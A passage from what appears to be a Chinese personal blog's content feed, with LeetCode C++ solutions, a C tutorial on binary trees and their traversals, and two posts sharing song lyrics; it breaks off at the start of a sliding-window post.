<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    直接合并 之后 再排序O((m+n)log(m+n))</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            nums1[m+i] = nums2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(nums1.<span class="built_in">begin</span>(),nums1.<span class="built_in">end</span>());<span class="comment">//排序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针O(m+n)    </span></span><br><span class="line"><span class="comment">    额外空间int sorted[m+n]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1=<span class="number">0</span>,p2=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sorted[m+n];</span><br><span class="line">        <span class="keyword">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span>(p1&lt;m || p2&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1==m)</span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(p2==n)</span><br><span class="line">                cur = nums1[p1++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums1[p1] &lt; nums2[p2])</span><br><span class="line">                cur = nums1[p1++]; <span class="comment">//取两个数组中 头部较小的那个</span></span><br><span class="line">            <span class="keyword">else</span>    </span><br><span class="line">                cur = nums2[p2++];</span><br><span class="line">            sorted[p1+p2<span class="number">-1</span>] = cur;<span class="comment">//p1+p2-1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m+n;i++)</span><br><span class="line">            nums1[i] = sorted[i];<span class="comment">//再 赋给nums1数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    逆向双指针O(m+n)</span></span><br><span class="line"><span class="comment">    不用额外空间 sorted[]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> p1=m<span class="number">-1</span>,p2=n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> tail = m+n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> cur;</span><br><span class="line">        <span class="keyword">while</span>(p1&gt;=<span class="number">0</span> || p2&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p1==<span class="number">-1</span>)</span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(p2==<span class="number">-1</span>)</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums1[p1] &gt; nums2[p2])</span><br><span class="line">                cur = nums1[p1--];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                cur = nums2[p2--];</span><br><span class="line">            nums1[tail--] = cur;<span class="comment">//逆向 赋值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="2465-不同的平均值数目"><a href="#2465-不同的平均值数目" class="headerlink" title="2465 不同的平均值数目"></a>2465 不同的平均值数目</h3><p>长度为 偶数 的整数数组 nums 。<br>只要 nums 不是 空数组，你就重复执行以下步骤：</p>
<pre><code>找到 nums 中的最小值，并删除它。
找到 nums 中的最大值，并删除它。
计算删除两数的平均值。
</code></pre>
<p>两数 a 和 b 的 平均值 为 (a + b) / 2 。<br><strong>返回得到的 不同 平均值的数目</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    排序+哈希表</span></span><br><span class="line"><span class="comment">    双指针、「不同平均值的数目」和「不同和的数目」是等价的</span></span><br><span class="line"><span class="comment">    避免浮点运算</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">distinctAverages</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());<span class="comment">//升序排序</span></span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; ans;<span class="comment">//不重复</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, j=nums.<span class="built_in">size</span>()<span class="number">-1</span>; i&lt;j; i++,j--)&#123;</span><br><span class="line">            ans.<span class="built_in">insert</span>(nums[i]+nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans.<span class="built_in">size</span>();<span class="comment">//返回 set大小即可</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>力扣刷题</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>力扣</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉树</title>
    <url>/2021/11/13/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>由结点构成的有限集合，集合可为空，或者是由一个根结点以及两颗互不相交的分别称作 该根结点的左子树域右子树的二叉树组成。</p>
<p>空二叉树</p>
<p><strong>二叉树五种基本形态</strong></p>
<p><img src="https://i.loli.net/2021/10/30/QzNZd9lI8VtuiMG.png" alt="image-20211030164242923"></p>
<blockquote>
<p><strong>二叉树与一般的树型结构的区别在于：</strong></p>
<ul>
<li>二叉树中每个非空结点最多只有两个子女，而一般的树型结构中每个非空结点可以有0到多<br>个子女;</li>
<li>二叉树中结点的子树要区分左子树和右子树，即使在结点只有一棵子树的情况下也要明确指<br>出是左子树还是右子树。</li>
</ul>
</blockquote>
<h2 id="1-2-二叉树-性质"><a href="#1-2-二叉树-性质" class="headerlink" title="1.2 二叉树 性质"></a>1.2 二叉树 性质</h2><ul>
<li><p><strong>性质1：</strong>一棵非空二叉树的 <code>第i层</code>  上至多有 <code>2 的 i-1 次方</code>  个 结点 (i≥1)。</p>
</li>
<li><p><strong>性质2：</strong>深度为h的二叉树至多有 <code>2 的 h 次方 -1</code> 个结点(h&gt;1) 。</p>
</li>
<li><p><strong>性质3：</strong> 对于任何一棵二叉树T，如果其终端结点数为no，度为2的结点数为n2，则 no=n2+1。</p>
</li>
<li><p><strong>性质4：</strong>具有 n 个结点的完全二叉树的深度 是 <code>[log以2为底n的对数] + 1</code></p>
</li>
</ul>
<p><strong>其它性质：</strong></p>
<p><img src="https://i.loli.net/2021/10/30/4kDm5FiaLGntrZe.png" alt="image-20211030164825001"></p>
<p><strong>完全二叉树、满二叉树：</strong></p>
<p><img src="https://i.loli.net/2021/10/30/9pg6GoC28vPEsVu.png" alt="image-20211030164916049"></p>
<p><strong>完全二叉树的性质：</strong></p>
<p><img src="https://i.loli.net/2021/10/30/d7EBmp4CgeXqG58.png" alt="image-20211030165111674"></p>
<h2 id="1-3-二叉树的-存储结构"><a href="#1-3-二叉树的-存储结构" class="headerlink" title="1.3 二叉树的 存储结构"></a>1.3 二叉树的 存储结构</h2><h3 id="1-3-1-完全二叉树-的-顺序存储"><a href="#1-3-1-完全二叉树-的-顺序存储" class="headerlink" title="1.3.1 完全二叉树 的 顺序存储"></a>1.3.1 完全二叉树 的 顺序存储</h3><p>按照 二叉树 从上到下、同一层次 从左到右的顺序，依次将结点存储在 一个 <strong>一维数组</strong> 中。</p>
<p>利用完全二叉树的性质</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;  <span class="comment">//二叉树结点类型</span></span><br><span class="line">datatype tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;  <span class="comment">//树 实际所含结点个数</span></span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/10/30/f6vuodkaFwZjc9Y.png" alt="image-20211030165424030"></p>
<h3 id="1-3-2-一般二叉树-的-顺序存储"><a href="#1-3-2-一般二叉树-的-顺序存储" class="headerlink" title="1.3.2 一般二叉树 的 顺序存储"></a>1.3.2 一般二叉树 的 顺序存储</h3><p>每个结点：三个域</p>
<p>值域：data</p>
<p><strong>不带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>     <span class="comment">//结点值类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;  <span class="comment">//存放 左、右 子女下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];  </span><br><span class="line"><span class="keyword">int</span> n;			<span class="comment">//树中实际所含结点个数</span></span><br><span class="line"><span class="keyword">int</span> root;		<span class="comment">//存放根结点的下标</span></span><br></pre></td></tr></table></figure>

<p><strong>带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> lchild,rchild;</span><br><span class="line">    <span class="keyword">int</span> parent;  <span class="comment">//存放双亲结点下标</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line">node tree[MAXSIZE];</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> root;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/SCeVzquhiojcy5A.png" alt="image-20211030165952310"></p>
<h3 id="1-3-2-链式存储"><a href="#1-3-2-链式存储" class="headerlink" title="1.3.2 链式存储"></a>1.3.2 链式存储</h3><p>每个结点：三个域</p>
<p>值域：data</p>
<p>指针域：分别指向左右子树</p>
<p><strong>不带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>    <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span>  <span class="comment">//指向左右子树的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;</span><br></pre></td></tr></table></figure>

<p><strong>带双亲：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>   <span class="comment">//二叉树结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">lchild</span>,*<span class="title">rchild</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span>  <span class="comment">//指向双亲的指针</span></span><br><span class="line">&#125;bintnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> bintnode *bintree;</span><br><span class="line">bintree root;				<span class="comment">//指向二叉树根结点的指针</span></span><br></pre></td></tr></table></figure>



<p><img src="https://i.loli.net/2021/10/30/mFjtMqDdRkezGc2.png" alt="image-20211030170230015"></p>
<h2 id="1-4-二叉树的遍历-—–-递归实现"><a href="#1-4-二叉树的遍历-—–-递归实现" class="headerlink" title="1.4 二叉树的遍历  —– 递归实现"></a>1.4 二叉树的遍历  —– 递归实现</h2><p>按照一定的顺序对二叉树这每个结点进行访问，且只能访问一次。</p>
<p><img src="https://i.loli.net/2021/10/30/YIS3fLvetOKocgH.png" alt="image-20211030171335598"></p>
<h3 id="1-4-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-4-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.4.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.4.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        preorder(t-&gt;lchild);</span><br><span class="line">        preorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-4-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.4.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.4.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        inorder(t-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">        inorder(t-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-4-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.4.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.4.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(t)&#123;</span><br><span class="line">        postorder(t-&gt;lchild);</span><br><span class="line">        postorder(t-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-5-二叉树的创建"><a href="#1-5-二叉树的创建" class="headerlink" title="1.5 二叉树的创建"></a>1.5 二叉树的创建</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//按照前序遍历的结果创建一颗 给定 二叉树</span></span><br><span class="line"><span class="function">bintree <span class="title">createbintree</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    bintree t;</span><br><span class="line">    <span class="keyword">if</span>((ch = getchar()) == <span class="string">&#x27;#&#x27;</span>) <span class="comment">//空子树</span></span><br><span class="line">        t = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        t = (bintree *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(bintnode));</span><br><span class="line">        t-&gt;data = ch;</span><br><span class="line">        t-&gt;lchild = createbintree();</span><br><span class="line">        t-&gt;rchild = createbintree();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注：输入时，必须按照 前序遍历 的顺序进行输入</span></span><br></pre></td></tr></table></figure>

<h2 id="1-6-二叉树的遍历-—–-非递归实现"><a href="#1-6-二叉树的遍历-—–-非递归实现" class="headerlink" title="1.6 二叉树的遍历  —– 非递归实现"></a>1.6 二叉树的遍历  —– 非递归实现</h2><p>二叉树的 递归遍历 算法较简易，但是运行时间长，执行效率较低，下面是非递归算法实现二叉树的遍历。</p>
<p><strong>使用一个 <code>栈</code> 来进行回溯</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//顺序栈的定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">    bintree data[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> tag[<span class="number">100</span>];		<span class="comment">//为栈中每个元素设置的标记，便于 后序遍历</span></span><br><span class="line">    <span class="keyword">int</span> top;			<span class="comment">//栈顶指针</span></span><br><span class="line">&#125;seqstack;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(seqstack *s,bintree)</span></span>&#123;</span><br><span class="line">    s-&gt;data[s-&gt;top] = t;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈</span></span><br><span class="line"><span class="function">bintree <span class="title">pop</span><span class="params">(seqstack *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top != <span class="number">0</span>)&#123;  		<span class="comment">//判空</span></span><br><span class="line">        s-&gt;top--;</span><br><span class="line">        <span class="keyword">return</span>(s-&gt;data[s-&gt;top]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-6-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.6.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.6.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><ul>
<li><p>当访问完 根结点之后，紧接着该访问其左子树，但前提是必须先使 当前结点放于 栈中保存起来，便于之后 右子树的访问。</p>
</li>
<li><p>当栈中的元素位于栈顶即将出栈时，则意味着根结点和左子树已经访问完成，出栈之后即可进行右子树的访问。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;		<span class="comment">//当前处理的子树不为空栈 或 栈不为空 时</span></span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-2-中序遍历-—-左-gt-根-gt-右"><a href="#1-6-2-中序遍历-—-左-gt-根-gt-右" class="headerlink" title="1.6.2 中序遍历 —- 左-&gt;根-&gt;右"></a>1.6.2 中序遍历 —- <code>左-&gt;根-&gt;右</code></h3><ul>
<li><p>首先访问 左子树，但由于此时 根结点和 右子树都未进行访问，则 需要将其 先放入栈中保存起来，以便之后对根结点和右子树的访问。</p>
</li>
<li><p>当栈中元素位于栈顶即将出栈时，即意味着其左子树已经访问完成，出栈后 则可 进行根结点和右子树的访问。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t!=<span class="literal">NULL</span>) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            push(&amp;s,t);</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = pop(&amp;s);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-3-后序遍历-—-左-gt-右-gt-根"><a href="#1-6-3-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.6.3 后序遍历 —- 左-&gt;右-&gt;根"></a>1.6.3 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><ul>
<li><p>首先进行左子树的访问，同样需要将其先保存在栈中，便于之后对其 右子树以及根节点的访问。</p>
</li>
<li><p>需要使用 <code>seqstack类型  中的  数组 tag</code> ，其每个元素的值为0 或 1，用于标识栈中每个元素的状态。</p>
<p>当一个元素刚刚进栈时，当它第一次位于栈顶即将被处理时，其 tag 值为 0，意味着它的 右子树还没有进行访问，则接下来就应该访问它的 右子树，该元素仍旧在栈中，然后将其 tag 值改为 1，意味着此时其 右子树已经访问完成，当其第二次出现在栈顶即将被处理时，则意味着接下来应该访问它本身，即根结点，并将其出栈。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>像真的一样</title>
    <url>/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你习惯 可能会幸福的预感</p>
<p>你期盼 等暧昧过完 能改写身份这一栏</p>
<p>你鼻酸 就算都与你无关</p>
<p>他心烦 你跟着想要呐喊</p>
<p>恋人们的手说放就放</p>
<p>知己就没分手的情况</p>
<p>能在彼此身旁</p>
<p>你最擅长模仿 像真的一样</p>
<p>是伪装或武装 用友情来匿藏</p>
<p>你多想 躺一躺 他肩膀</p>
<p>你最擅长模仿 像真的坚强</p>
<p>孤独无尽漫长 背负着一个谎</p>
<p>他清场 他怯场 他离场 你都是暖场</p>
<p>边拐弯 打听关于爱的答案</p>
<p>边感叹 感情的艰难 却对感情避而不谈</p>
<p>另一半 若像是太阳一般</p>
<p>天一寒 怎么向你来取暖</p>
<p>恋人们的手说放就放</p>
<p>遗憾转身就遗忘</p>
<p>你还在他身旁</p>
<p>你最擅长模仿 像真的一样</p>
<p>是伪装或武装 用友情来匿藏</p>
<p>你多想 躺一躺 他肩膀</p>
<p>你最擅长模仿 像真的坚强</p>
<p>孤独无尽漫长 背负着一个谎</p>
<p>他清场 他怯场 他离场 你都是暖场</p>
<p>消音的话 只会更强化 不能没有他</p>
<p>你最擅长模仿 像真的一样</p>
<p>是伪装或武装 用友情来匿藏</p>
<p>你多想 躺一躺 他肩膀</p>
<p>你最擅长模仿 像真的坚强</p>
<p>孤独无尽漫长 背负着一个谎</p>
<p><strong>他清场 他怯场 他离场 你都是暖场</strong></p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>保留</title>
    <url>/2021/10/10/%E4%BF%9D%E7%95%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 郭顶</p>
<p>作曲 : 郭顶</p>
<p>看见 你在我眼前</p>
<p>不去猜想我们隔多远</p>
<p>当我 夜幕中准备</p>
<p>只想让沉默的能开解</p>
<p>在不同的遭遇里我发现你的瞬间</p>
<p>有种不可言说的温柔直觉</p>
<p>在有限的深夜消失之前触摸你的脸</p>
<p>我情愿这是幻觉 也不愿是种告别</p>
<p>已经忘了 你的名字</p>
<p>就在这座 寂静星石</p>
<p>怎么还有 你的样子</p>
<p>被保留</p>
<p>给我 一整个拥抱</p>
<p>好让我不至于 太潦倒</p>
<p>时间 过一分一秒</p>
<p>还是觉得相遇 太美好</p>
<p>在不同的遭遇里我发现你的瞬间</p>
<p>有种不可言说的温柔直觉</p>
<p>当不远的蓝色渐渐显现这无边境界</p>
<p>我始终等待再见 只不愿再也不见</p>
<p>已经忘了 你的名字</p>
<p>就在这座 寂静星石</p>
<p>怎么还有 你的样子</p>
<p>想形容你的句子 关于你所有心事</p>
<p>一眼能及的钻石 哪一个是你地址</p>
<p>忘了 你的名字</p>
<p>就在这座 寂静星石</p>
<p>怎么还有 你的样子</p>
<p>我始终等待再见 只不愿再也不见</p>
<p>真的忘了 你的名字</p>
<p>是在哪座 寂静星石</p>
<p>一直还有 你的样子</p>
<p>被保留</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>八、滑动窗口</title>
    <url>/2025/12/03/%E5%85%AB%E3%80%81%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="八、滑动窗口"><a href="#八、滑动窗口" class="headerlink" title="八、滑动窗口"></a>八、滑动窗口</h2><h3 id="76-最小覆盖子串"><a href="#76-最小覆盖子串" class="headerlink" title="76 最小覆盖子串"></a>76 最小覆盖子串</h3><p>给你一个字符串 s 、一个字符串 t 。返回 s 中<strong>涵盖 t 所有字符</strong>的【最小子串】。如果 s 中不存在涵盖 t 所有字符的子串，则返回空字符串 “” 。</p>
<p>注意：</p>
